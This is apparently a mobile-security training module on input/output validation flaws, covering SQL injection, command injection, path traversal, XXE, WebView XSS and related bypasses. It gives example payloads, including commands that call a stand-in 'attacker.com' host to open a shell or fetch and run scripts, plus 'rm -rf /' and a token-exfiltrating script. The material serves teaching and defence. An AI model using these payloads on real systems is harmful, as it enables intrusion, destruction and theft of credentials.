# M04: Insufficient Input/Output Validation - Attack Vectors

## Table of Contents
- [Understanding Input/Output Validation Attacks](#understanding-inputoutput-validation-attacks)
- [Input Validation Attack Vectors](#input-validation-attack-vectors)
- [Output Validation Attack Vectors](#output-validation-attack-vectors)
- [Attack Scenarios](#attack-scenarios)
- [Attack Chain Analysis](#attack-chain-analysis)
- [Exploitation Techniques](#exploitation-techniques)

## Understanding Input/Output Validation Attacks

Input/output validation attacks exploit the application's failure to properly sanitize, validate, or encode data flowing in and out of the mobile application. These attacks can occur at multiple layers: user input, API communications, local storage, and data display.

### The Trust Boundary Problem

```
External Data Sources → Mobile App → Backend/Storage → Mobile App → Display
        ↓                    ↓              ↓              ↓           ↓
    Untrusted           Validate?      Validate?      Encode?     Sanitize?
```

## Input Validation Attack Vectors

### 1. SQL Injection (SQLi)

**Attack Flow:**
```
User Input: ' OR '1'='1
    ↓
Query: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
    ↓
Result: Authentication bypass, all users returned
```

**Mobile-Specific Scenarios:**
- Local SQLite database queries
- API parameters sent to backend
- Search functionality
- Filter operations
- Deep link parameters

**Example Attack Payloads (Conceptual):**
```
' OR 1=1--
'; DROP TABLE users--
' UNION SELECT password FROM users--
admin'--
```

**Impact:**
- Data exfiltration
- Data modification/deletion
- Authentication bypass
- Privilege escalation

### 2. Command Injection

**Attack Flow:**
```
User Input: file.txt; rm -rf /
    ↓
System Command: cat file.txt; rm -rf /
    ↓
Result: File deletion, system compromise
```

**Mobile Attack Surfaces:**
- File name processing
- URL schemes
- Native bridge calls
- System utility invocations
- Shell command execution

**Conceptual Payloads:**
```
file.txt && malicious-command
file.txt | nc attacker.com 4444
$(wget http://attacker.com/shell.sh)
```

### 3. Path Traversal

**Attack Flow:**
```
User Input: ../../etc/passwd
    ↓
File Access: /app/files/../../etc/passwd
    ↓
Result: Access to system files outside app sandbox
```

**Mobile-Specific Paths:**
```
../../../data/data/com.app/databases/
..%2f..%2f..%2fshared_prefs/
....//....//sensitive_file.xml
```

**Targets:**
- File upload/download functionality
- Document viewers
- Cache management
- Backup/restore features
- Image/media loading

### 4. XML/JSON Injection

**XML External Entity (XXE) Attack:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**JSON Injection:**
```json
{
  "user": "admin",
  "role": "user\",\"role\":\"admin"
}
```

**Mobile Contexts:**
- API request/response parsing
- Configuration file parsing
- Deep link data
- QR code data processing

### 5. Cross-Site Scripting (XSS) in WebViews

**Stored XSS Attack:**
```javascript
<script>
  // Exfiltrate session tokens
  fetch('http://attacker.com/?token=' + localStorage.getItem('token'));
</script>
```

**Reflected XSS:**
```
myapp://search?q=<script>alert(document.cookie)</script>
```

**Mobile WebView Risks:**
- JavaScript bridge exploitation
- Cookie theft
- Local storage access
- Camera/location access via WebView APIs

### 6. Integer Overflow/Underflow

**Attack Scenario:**
```
Input: 2147483647 (MAX_INT)
Operation: +1
Result: -2147483648 (wraps around)
```

**Mobile Applications:**
- In-app purchase amount manipulation
- Counter/score manipulation
- Resource allocation (memory, storage)
- Transaction amounts

### 7. Buffer Overflow

**Attack Pattern:**
```
Expected Input: 10 characters
Actual Input: 1000 characters
Result: Memory corruption, potential code execution
```

**Mobile Native Code Risks:**
- JNI/NDK functions
- Native library calls
- C/C++ components
- Custom protocol parsers

### 8. Format String Attacks

**Conceptual Attack:**
```
Input: %x %x %x %x %x
Logging: printf(user_input)
Result: Memory disclosure
```

**Mobile Logging Issues:**
- Debug logs with user input
- Error messages
- Analytics data
- Crash reports

## Output Validation Attack Vectors

### 1. Improper Output Encoding

**HTML Context:**
```javascript
// Vulnerable
webView.loadData("<html><body>" + userInput + "</body></html>")

// Attack Input: <script>malicious()</script>
// Result: XSS execution
```

**JavaScript Context:**
```javascript
// Vulnerable
webView.loadUrl("javascript:search('" + query + "')")

// Attack Input: '); malicious(); //
// Result: Arbitrary JavaScript execution
```

### 2. Log Injection

**Attack:**
```
Username: admin\n[INFO] Authentication successful for root
Actual Log:
[INFO] Login attempt: admin
[INFO] Authentication successful for root
```

**Impact:**
- Log poisoning
- Audit trail manipulation
- SIEM evasion
- Incident response confusion

### 3. Data Leakage via Improper Sanitization

**Sensitive Data Exposure:**
```
// Error message includes sensitive data
"Database error: connection failed to db.internal:3306 with password 'P@ssw0rd123'"
```

**Information Disclosure:**
- Stack traces with paths
- Database error messages
- API error responses
- Debug information

## Attack Scenarios

### Scenario 1: SQLi in Mobile Banking App

```
Attack Flow:
1. Attacker opens mobile banking app
2. Login screen accepts username/password
3. Attacker enters: ' OR '1'='1' --
4. App constructs query:
   SELECT * FROM accounts WHERE username='' OR '1'='1' --' AND password=''
5. Query returns all accounts
6. Attacker gains access to first admin account
7. Can view all transactions, transfer funds
```

**Impact:** Complete account compromise, financial fraud

### Scenario 2: Path Traversal in File Manager App

```
Attack Flow:
1. App allows users to download files
2. Filename parameter: /download?file=document.pdf
3. Attacker modifies: /download?file=../../../databases/app.db
4. App doesn't validate path
5. Attacker downloads entire SQLite database
6. Database contains user credentials, PII
```

**Impact:** Data breach, credential theft

### Scenario 3: XSS in Social Media App WebView

```
Attack Flow:
1. Attacker posts malicious comment with XSS payload
2. Victim opens comment in app's WebView
3. JavaScript executes in WebView context
4. Script accesses JavaScript bridge
5. Exfiltrates authentication tokens
6. Attacker hijacks victim's account
```

**Impact:** Account takeover, data theft

### Scenario 4: Command Injection in File Processing

```
Attack Flow:
1. App allows image upload with conversion
2. Backend processes: convert uploaded_file.jpg output.png
3. Attacker uploads file named: image.jpg; curl http://attacker.com | sh
4. Server executes: convert image.jpg; curl http://attacker.com | sh output.png
5. Malicious script downloaded and executed
6. Server compromised
```

**Impact:** Remote code execution, server compromise

### Scenario 5: Integer Overflow in In-App Purchase

```
Attack Flow:
1. E-commerce app processes purchase
2. Price: $99.99, Quantity field accepts input
3. Attacker enters quantity: 2147483647
4. Calculation: 99.99 * 2147483647 = Integer overflow
5. Result: Negative or very small amount
6. Transaction processed for $0.01
7. Attacker receives expensive items for free
```

**Impact:** Financial loss, inventory issues

## Attack Chain Analysis

### Phase 1: Reconnaissance

**Attacker Activities:**
- Analyze app's input fields
- Test boundary conditions
- Identify validation mechanisms
- Map data flow
- Find injection points

**Tools Used:**
- Proxy tools (Burp Suite, OWASP ZAP)
- Decompilers (jadx, apktool)
- Debuggers (Frida, lldb)
- Fuzzing tools

### Phase 2: Vulnerability Identification

**Testing Methods:**
- Fuzzing input fields
- Boundary value analysis
- Special character injection
- Format string testing
- Path traversal attempts
- SQL injection payloads

**Indicators of Vulnerability:**
- Error messages revealing structure
- Unexpected app behavior
- Database errors
- File access errors
- Command execution signs

### Phase 3: Exploitation

**Attack Execution:**
- Craft specific payload
- Bypass client-side validation
- Exploit server-side weakness
- Chain multiple vulnerabilities
- Maintain persistence

**Techniques:**
- Parameter manipulation
- Request interception/modification
- Encoding/decoding tricks
- Logic abuse
- Race conditions

### Phase 4: Post-Exploitation

**Attacker Goals:**
- Data exfiltration
- Privilege escalation
- Lateral movement
- Persistence establishment
- Cover tracks

## Exploitation Techniques

### 1. Client-Side Validation Bypass

**Technique:**
```
1. Intercept request with proxy
2. Modify parameters after client validation
3. Send modified request to server
4. Server processes without validation
```

**Prevention Requirement:** Server-side validation mandatory

### 2. Encoding/Obfuscation

**URL Encoding:**
```
../../../ → %2e%2e%2f%2e%2e%2f%2e%2e%2f
<script> → %3Cscript%3E
```

**Double Encoding:**
```
../ → %252e%252e%252f
```

**Unicode Bypasses:**
```
../ → ..%c0%af
< → \u003c
```

### 3. Null Byte Injection

**Technique:**
```
filename.pdf%00.jpg
→ Server validates .jpg extension
→ System processes as .pdf (truncates at null byte)
```

### 4. CRLF Injection

**HTTP Header Injection:**
```
Input: value\r\nSet-Cookie: session=attacker
Result: Injected header in HTTP response
```

### 5. Race Conditions

**TOCTOU (Time-of-Check-Time-of-Use):**
```
1. Request validation check
2. Between check and use, modify data
3. Invalid data processed
```

## Detection Indicators

### Application Behavior

**Signs of SQLi:**
- Database error messages
- Slow query responses
- Different responses for ' vs "
- Boolean-based response differences

**Signs of Command Injection:**
- Delayed responses (sleep commands)
- DNS lookbacks
- Network connections
- Process spawning

**Signs of Path Traversal:**
- Access to unexpected files
- Error messages about file paths
- Directory listings
- Sensitive file content

### Network Traffic

**Suspicious Patterns:**
- Encoded special characters in requests
- Unusual parameter values
- Repeated injection attempts
- Automated scanning patterns

## Risk Assessment

### Critical Risk Scenarios

- SQL injection in authentication
- Command injection in file processing
- Path traversal with write access
- XSS with JavaScript bridge access
- Integer overflow in financial transactions

### High Risk Scenarios

- JSON/XML injection in API
- LDAP injection
- XPath injection
- Template injection
- File inclusion vulnerabilities

### Medium Risk Scenarios

- Log injection
- HTTP header injection
- Email header injection
- CSV injection

## Key Takeaways

1. **Never trust user input - validate everything**
2. **Validate on server-side, not just client-side**
3. **Use parameterized queries, never string concatenation**
4. **Encode output based on context (HTML, JavaScript, SQL)**
5. **Implement defense-in-depth: input validation + output encoding + least privilege**
6. **Regular security testing including fuzzing and penetration testing**

## Next Steps

- **[Prevention Guide](./prevention.md)**: Learn comprehensive validation techniques
- **[Examples](./examples.md)**: See vulnerable vs secure code
- **[Interactive Lab](./lab/)**: Practice identifying and fixing validation issues

---

**Remember**: Assume all input is malicious until proven otherwise. Validate on input, encode on output.
